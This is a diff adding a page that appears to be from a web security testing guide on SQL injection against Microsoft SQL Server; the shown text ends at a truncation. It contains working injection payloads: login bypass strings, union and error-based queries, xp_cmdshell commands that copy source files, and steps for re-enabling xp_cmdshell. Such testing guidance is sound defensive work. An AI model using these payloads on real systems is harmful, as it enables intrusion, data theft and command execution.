@@ -1,0 +1,142 @@
+WSTG-INPV-05-3: SQL Server
+
+## Summary
+In this section some SQL Injection techniques that utilize specific features of Microsoft SQL Server will be discussed.
+
+SQL injection vulnerabilities occur whenever input is used in the construction of an SQL query without being adequately constrained or sanitized. The use of dynamic SQL (the construction of SQL queries by concatenation of strings) opens the door to these vulnerabilities. SQL injection allows an attacker to access the SQL servers and execute SQL code under the privileges of the user used to connect to the database.
+
+As explained in SQL injection, a SQL-injection exploit requires two things: an entry point, and an exploit to enter. Any user-controlled parameter that gets processed by the application might be hiding a vulnerability. This includes:
+
+- Application parameters in query strings (e.g., GET requests)
+- Application parameters included as part of the body of a POST request
+- Browser-related information (e.g., user-agent, referrer)
+- Host-related information (e.g., hostname, IP)
+- Session-related information (e.g., user ID, cookies)
+
+Microsoft SQL server has a few unique characteristics, so some exploits need to be specially customized for this application.
+
+## How to Test
+### SQL Server Characteristics
+
+To begin, let's see some SQL Server operators and commands/stored procedures that are useful in a SQL Injection test:
+
+- comment operator: `--` (useful for forcing the query to ignore the remaining portion of the original query; this won't be necessary in every case)
+- query separator: `;` (semicolon)
+- Useful stored procedures and features include:
+    - xp_cmdshell executes a command shell on the server under the SQL Server service account context. It requires `sysadmin` privileges and has been disabled by default since SQL Server 2005 (it can be re-enabled with `sp_configure` when advanced options are shown).
+    - `xp_regread` reads an arbitrary value from the Registry (undocumented extended procedure)
+    - `xp_regwrite` writes an arbitrary value into the Registry (undocumented extended procedure)
+    - sp_makewebtask) (removed; present only on very old SQL Server versions) wrote query results to a file via the Web Assistant.
+    - xp_sendmail) (removed with SQL Mail) sent email that could include a query result set attachment.
+
+The examples below focus on techniques that remain relevant on SQL Server and Azure SQL Managed Instance when privileged features are exposed. Most use `exec`.
+
+Below we show how to execute a shell command that writes the output of the command `dir c:\inetpub` in a browseable file, assuming that the web server and the DB server reside on the same host. The following syntax uses `xp_cmdshell`:
+
+`exec master.dbo.xp_cmdshell 'dir c:\inetpub > c:\inetpub\wwwroot\test.txt'--`
+
+On legacy SQL Server versions that still provide Web Assistant procedures, `sp_makewebtask` could be used instead:
+
+`exec sp_makewebtask 'C:\Inetpub\wwwroot\test.txt', 'select * from master.dbo.sysobjects'--`
+
+A successful execution will create a file that can be browsed by the tester.
+
+In addition, SQL Server built-in functions and environment variables are very handy. The following uses the function `db_name()` to trigger an error that will return the name of the database:
+
+`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20db_name())`
+
+Notice the use of convert:
+
+`CONVERT ( data_type [ ( length ) ] , expression [ , style ] )`
+
+`CONVERT` will try to convert the result of `db_name` (a string) into an integer variable, triggering an error, which, if displayed by the vulnerable application, will contain the name of the DB.
+
+The following example uses the environment variable `@@version`, combined with a `union select`-style injection, in order to find the version of the SQL Server.
+
+`/form.asp?prop=33%20union%20select%201,2006-01-06,2007-01-06,1,'stat','name1','name2',2006-01-06,1,@@version%20--`
+
+And here's the same attack, but using again the conversion trick:
+
+`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20@@VERSION)`
+
+Information gathering is useful for exploiting software vulnerabilities at the SQL Server, through the exploitation of an SQL-injection attack or direct access to the SQL listener.
+
+In the following, we show several examples that exploit SQL injection vulnerabilities through different entry points.
+
+### Example 1: SQL Injection in a GET Request
+
+The most simple (and sometimes most rewarding) case would be that of a login page requesting an username and password for user login. You can try entering the following string "' or '1'='1" (without double quotes):
+
+`https://vulnerable.web.app/login.asp?Username='%20or%20'1'='1&Password='%20or%20'1'='1`
+
+If the application is using Dynamic SQL queries, and the string gets appended to the user credentials validation query, this may result in a successful login to the application.
+
+### Example 2: SQL Injection in a GET Request
+
+In order to learn how many columns exist
+
+`https://vulnerable.web.app/list_report.aspx?number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--`
+
+### Example 3: Testing in a POST Request
+
+SQL Injection, HTTP POST Content: `email=%27&whichSubmit=submit&submit.x=0&submit.y=0`
+
+A complete post example (`https://vulnerable.web.app/forgotpass.asp`):
+
+```txt
+POST /forgotpass.asp HTTP/1.1
+Host: vulnerable.web.app
+[...]
+Referer: https://vulnerable.web.app/forgotpass.asp
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+
+email=%27&whichSubmit=submit&submit.x=0&submit.y=0
+```
+
+The error message obtained when a `'` (single quote) character is entered at the email field is:
+
+```txt
+Microsoft OLE DB Provider for SQL Server error '80040e14'
+Unclosed quotation mark before the character string '' '.
+/forgotpass.asp, line 15
+```
+
+### Example 4: Yet Another (Useful) GET Example
+
+Obtaining the application's source code
+
+`a' ; master.dbo.xp_cmdshell ' copy c:\inetpub\wwwroot\login.aspx c:\inetpub\wwwroot\login.txt';--`
+
+### Example 5: Enabling or Replacing `xp_cmdshell`
+
+Security baselines keep `xp_cmdshell` disabled. With `sysadmin` rights (natively or after recovering the `sa` or admin password; see below), re-enable it or recreate equivalent functionality.
+
+Enable `xp_cmdshell` by injecting:
+
+```sql
+master..sp_configure 'show advanced options',1
+reconfigure
+master..sp_configure 'xp_cmdshell',1
+reconfigure
+```
+
+On legacy SQL Server 2000 estates, if `xp_cmdshell` was removed with `sp_dropextendedproc`, it could be restored with:
+
+`sp_addextendedproc 'xp_cmdshell','xp_log70.dll'`
+
+If that failed because `xp_log70.dll` was moved or deleted, a custom procedure using OLE Automation (`sp_OACreate`, `sp_OAMethod`, `sp_OADestroy`) could recreate shell execution, as described by Antonin Foller (see links at the bottom of the page), provided OLE Automation remained enabled.
+
+### Example 6: Referer / User-Agent
+
+The `REFERER` header set to:
+
+`Referer: https://vulnerable.web.app/login.aspx', 'user_agent', 'some_ip'); [SQL CODE]--`
+
+Allows the execution of arbitrary SQL Code. The same happens with the User-Agent header set to:
+
+`User-Agent: user_agent', 'some_ip'); [SQL CODE]--`
+
+### Example 7: SQL Server as a Port Scanner
+
+[...truncated]
